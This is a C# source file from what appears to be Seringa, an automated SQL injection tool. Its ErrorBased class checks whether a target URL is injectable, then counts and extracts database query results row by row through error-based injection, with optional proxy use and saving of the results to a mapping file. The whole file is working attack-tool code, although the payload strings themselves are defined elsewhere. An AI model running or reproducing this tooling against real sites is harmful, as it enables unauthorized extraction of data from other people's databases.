using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Seringa.Engine.Interfaces;
using Seringa.Engine.Implementations.QueryRunners;
using Seringa.Engine.Utils;
using Seringa.Engine.Exceptions;
using Seringa.Engine.Utils.Extensions;
using Seringa.Engine.DataObjects;
using Seringa.Engine.Static;

namespace Seringa.Engine.Implementations.InjectionStrategies
{
    public class ErrorBased : IInjectionStrategy
    {
        
        #region Constructor

        public ErrorBased()
        {
            QueryRunner = new SimpleQueryRunner();
        }

        #endregion Constructor


        #region Public

        public int NrColumnsInOriginalQuery
        {
            get { return -1; }
            set { }
        }

        public int NumberOfResultsPerRequest
        {
            get { return 1;}
            set { }
        }
        public IList<int> ColumnIndexes
        {
            get { return null; }
            set {}
        }

        public string MappingFile { get; set; }

        public bool DetailedExceptions { get; set; }

        public IQueryRunner QueryRunner { get; set; }
        public IProxyDetails ProxyDetails { get; set; }
        
        public bool UseProxy { get; set; }

        public string Url { get; set; }

        public string DisplayName { get { return "Error based method"; } }

        public string SelectedDb { get; set; }
        public string SelectedTable { get; set; }

        public bool TestIfVulnerable()
        {
            string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, GeneralPayloads.ErrorBasedVictimIdentifier);
            
            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
            var result = HtmlHelpers.GetAnswerFromHtml(pageHtml,query,ExploitDetails,DetailedExceptions);

            return !string.IsNullOrEmpty(result) && result == GeneralPayloads.ErrorBasedVictimConfirmationResult;
        }


        public int GetTotalNoOfCustomQueryResultRows()
        {

            int count = 0;
            string generatedpayload = string.Empty;

            if (PayloadDetails == null)
                return 0;

            if (string.IsNullOrEmpty(PayloadDetails.Payload))
                return 0;

            if (PayloadDetails.ExpectedResultType == Enums.ExpectedResultType.Single)
                return 1;

            generatedpayload = PayloadDetails.Payload;

            if (PayloadDetails.Params != null && PayloadDetails.Params.Count() > 0)
                foreach(var param in PayloadDetails.Params)
                    generatedpayload = generatedpayload.Replace("{" + param.Position + "}", PayloadHelpers.GetData(param.Name, this));

            generatedpayload = /*UrlHelpers.HexEncodeValue(*/string.Format(GeneralPayloads.QueryResultCount, generatedpayload);//);

            string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, generatedpayload);
            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
            string countString = HtmlHelpers.GetAnswerFromHtml(pageHtml,query,ExploitDetails,DetailedExceptions);
            int.TryParse(countString, out count);

            return count;
        }

        public string GetSingleCustomQueryResultRow(int startingFrom)
        {
            string result = string.Empty;

            string generatedPayload = PayloadDetails.Payload;

            if (PayloadDetails.Params != null && PayloadDetails.Params.Count() > 0)
                foreach (var param in PayloadDetails.Params)
                    generatedPayload = generatedPayload.Replace("{" + param.Position + "}", PayloadHelpers.GetData(param.Name, this));

            if (PayloadDetails.ExpectedResultType == Enums.ExpectedResultType.Multiple)
                generatedPayload = string.Format(PayloadHelpers.GetSingleResultLimiter(PayloadDetails.Dbms), 
                                                                generatedPayload, startingFrom);

            string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, generatedPayload);
            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
            result = HtmlHelpers.GetAnswerFromHtml(pageHtml,query,ExploitDetails,DetailedExceptions);
            //@TODO: strip scripts
            if (!string.IsNullOrEmpty(MappingFile) && !string.IsNullOrEmpty(result))
                XmlHelpers.SaveToMappingFile(MappingFile, PayloadDetails, result, this,
                                                (this.ExploitDetails != null) ? this.ExploitDetails.Dbms : string.Empty);

            return result;
        }

        public ExploitDetails ExploitDetails { get; set; }
        public PayloadDetails PayloadDetails { get; set; }

        #endregion Public
    }
}
